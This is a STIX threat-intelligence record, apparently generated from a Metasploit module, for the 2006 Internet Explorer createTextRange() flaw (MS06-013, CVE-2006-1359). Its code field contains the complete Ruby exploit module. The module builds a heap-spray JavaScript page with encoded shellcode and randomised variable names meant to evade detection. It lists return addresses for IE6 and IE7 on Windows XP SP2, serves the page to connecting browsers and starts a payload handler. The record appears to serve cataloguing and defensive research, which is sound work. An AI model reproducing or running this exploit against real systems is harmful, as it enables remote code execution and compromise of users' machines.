{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ca40f532-15ca-47a1-afbf-205b89470aae",
    "created": "2024-08-14T16:42:03.677908Z",
    "modified": "2024-08-14T16:42:03.677912Z",
    "name": "MS06-013 Microsoft Internet Explorer createTextRange() Code Execution",
    "description": " This module exploits a code execution vulnerability in Microsoft Internet Explorer. Both IE6 and IE7 (Beta 2) are vulnerable. It will corrupt memory in a way, which, under certain circumstances, can lead to an invalid/corrupt table pointer dereference. EIP will point to a very remote, non-existent memory location. This module is the result of merging three different exploit submissions and has only been reliably tested against Windows XP SP2. This vulnerability was independently discovered by multiple parties. The heap spray method used by this exploit was pioneered by Skylined.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/ms06_013_createtextrange.rb",
            "external_id": "ms06_013_createtextrange.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-1359"
        },
        {
            "source_name": "reference",
            "url": "http://web.archive.org/web/20060418044756/http://secunia.com:80/secunia_research/2006-7/advisory/"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/lists/bugtraq/2006/Mar/0410.html"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/lists/fulldisclosure/2006/Mar/1439.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MS06-013 Microsoft Internet Explorer createTextRange() Code Execution',\n      'Description'    => %q{\n          This module exploits a code execution vulnerability in Microsoft Internet Explorer.\n        Both IE6 and IE7 (Beta 2) are vulnerable. It will corrupt memory in a way, which, under\n        certain circumstances, can lead to an invalid/corrupt table pointer dereference. EIP will point\n        to a very remote, non-existent memory location. This module is the result of merging three\n        different exploit submissions and has only been reliably tested against Windows XP SP2.\n        This vulnerability was independently discovered by multiple parties. The heap spray method\n        used by this exploit was pioneered by Skylined.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Faithless <rhyskidd[at]gmail.com>',\n          'Darkeagle <unl0ck.net>',\n          'hdm',\n          '<justfriends4n0w[at]yahoo.com>',\n          'Unknown',\n        ],\n      'References'     =>\n        [\n          ['CVE', '2006-1359'],\n          ['OSVDB', '24050'],\n          ['MSB', 'MS06-013'],\n          ['BID', '17196'],\n          ['US-CERT-VU', '876678'],\n          ['URL', 'http://web.archive.org/web/20060418044756/http://secunia.com:80/secunia_research/2006-7/advisory/'],\n          ['URL', 'https://seclists.org/lists/bugtraq/2006/Mar/0410.html'],\n          ['URL', 'https://seclists.org/lists/fulldisclosure/2006/Mar/1439.html']\n        ],\n      'Payload'        =>\n        {\n          'Space'          => 1024,\n          'BadChars'       => \"\\x00\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Internet Explorer 6 - (6.0.3790.0 - Windows XP SP2)', { 'Ret' => 0x746F9468 } ],\n          [ 'Internet Explorer 7 - (7.0.5229.0 - Windows XP SP2)', { 'Ret' => 0x3C0474C2 } ],\n\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2006-03-19'))\n  end\n\n  def on_request_uri(cli, request)\n\n    # Re-generate the payload\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    # Encode the shellcode\n    shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))\n\n    # Create some nops\n    nops = Rex::Text.to_unescape(make_nops(4))\n\n    # Generate a random XML namespace for VML\n    xmlns = rand_text_alpha(rand(30)+2)\n\n    # Randomize the javascript variable names\n    rnd              = rand(3)\n    var_inputtype    = ((rnd == 0) ? \"checkbox\" : ((rnd == 1) ? \"radio\" : \"image\"))\n    var_inp          = \"_\"+rand_text_alpha(rand(6)+3)\n    var_tmp          = \"_\"+rand_text_alpha(rand(6)+3)\n    var_payload      = \"_\"+rand_text_alpha(rand(6)+3)\n    var_nopslide     = \"_\"+rand_text_alpha(rand(6)+3)\n    var_slidesize    = \"_\"+rand_text_alpha(rand(6)+3)\n    var_fillblock    = \"_\"+rand_text_alpha(rand(6)+3)\n    var_memblock     = \"_\"+rand_text_alpha(rand(6)+3)\n    var_heap         = \"_\"+rand_text_alpha(rand(6)+3)\n    var_index        = \"_\"+rand_text_alpha(rand(6)+3)\n    var_maxIndex     = \"_\"+rand_text_alpha(rand(6)+3)\n    var_fillHeap     = \"_\"+rand_text_alpha(rand(6)+3)\n    var_start        = \"_\"+rand_text_alpha(rand(6)+3)\n    var_timer        = \"_\"+rand_text_alpha(rand(6)+3)\n    rnd              = rand(2)\n    var_setTimeout   = (rnd == 0) ? \"setTimeout('#{var_fillHeap}()', 5)\" : \"\"\n    var_setInterval  = (rnd == 1) ? \"setInterval('#{var_fillHeap}()', 5)\" : \"\"\n    randnop          = rand_text_alpha(rand(100) + 1)\n\n    # Build out the message\n    content = %Q|<html>\n<head>\n<script language = \"javascript\">\nvar #{var_payload} = unescape(\"#{shellcode}\");\nvar #{randnop} = \"#{nops}\";\nvar #{var_nopslide} = unescape(#{randnop});\nvar #{var_slidesize} = 20+#{var_payload}.length;\nwhile (#{var_nopslide}.length<#{var_slidesize}) { #{var_nopslide} += #{var_nopslide}; }\nvar #{var_fillblock} = #{var_nopslide}.substring(0,#{var_slidesize});\nvar #{var_memblock} = #{var_nopslide}.substring(0,#{var_nopslide}.length-#{var_slidesize});\nwhile(#{var_memblock}.length+#{var_slidesize} < 0x40000) { #{var_memblock} += #{var_fillblock}; }\nvar #{var_heap} = new Array();\nvar #{var_index} = 0;\nvar #{var_maxIndex} = 2020;\nfunction #{var_fillHeap}() {\n#{var_timer}.innerHTML = Math.round((#{var_index}/#{var_maxIndex})*100);\nif (#{var_index}<#{var_maxIndex}) {\n#{var_heap}.push(#{var_memblock}+#{var_payload});\n#{var_index}++;\n#{var_setTimeout}\n} else {\n#{var_timer}.innerHTML = 100;\n#{var_inp} = document.createElement(\"input\");\n#{var_inp}.type = \"#{var_inputtype}\";\n#{var_tmp} = #{var_inp}.createTextRange();\n}\n}\nfunction #{var_start}() {\n#{var_setTimeout}#{var_setInterval}\n}\n</script>\n</head>\n<body onload=\"#{var_start}()\">\n<span id=\"#{var_timer}\"> % </span>\n</body>\n</html>\n|\n\n    content = Rex::Text.randomize_space(content)\n\n    print_status(\"Sending #{self.name}\")\n\n    # Transmit the response to the client\n    send_response_html(cli, content)\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2006-03-19",
    "x_mitre_platforms": [
        "win'"
    ]
}